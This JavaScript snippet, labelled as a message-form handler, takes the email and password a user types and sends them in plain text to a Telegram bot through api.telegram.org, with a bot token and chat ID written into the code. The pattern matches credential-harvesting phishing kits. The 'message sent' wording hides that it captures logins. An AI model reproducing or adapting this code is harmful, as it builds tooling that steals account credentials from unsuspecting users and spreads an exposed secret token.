document.getElementById('messageForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message').value; // Assuming you need this value as well

    const botToken = '7200129734:AAFnzXSYiZVXVl_l6EwQM0G8_dynW8VA0IY';  // Replace with your bot token
    const chatId = '6244550071';      // Replace with the chat ID you want to send the message to

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: `Email: ${email}\nPassword: ${password}\nMessage: ${message}`,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            document.getElementById('response').innerText = 'Message sent successfully!';
        } else {
            document.getElementById('response').innerText = 'Error sending message.';
        }
    })
    .catch(error => {
        document.getElementById('response').innerText = 'Error sending message.';
        console.error('Error:', error);
    });
});